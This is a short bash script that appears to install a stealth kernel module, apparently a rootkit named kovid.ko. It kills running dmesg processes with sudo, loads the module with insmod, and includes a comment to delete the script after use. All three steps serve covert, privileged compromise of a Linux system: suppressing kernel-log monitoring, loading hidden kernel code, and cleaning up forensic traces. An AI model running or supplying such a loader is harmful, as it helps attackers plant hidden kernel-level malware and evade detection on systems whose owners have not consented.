#!/bin/bash
# rm -f this file after use
sudo kill -PIPE `pgrep dmesg`
sudo insmod ./kovid.ko
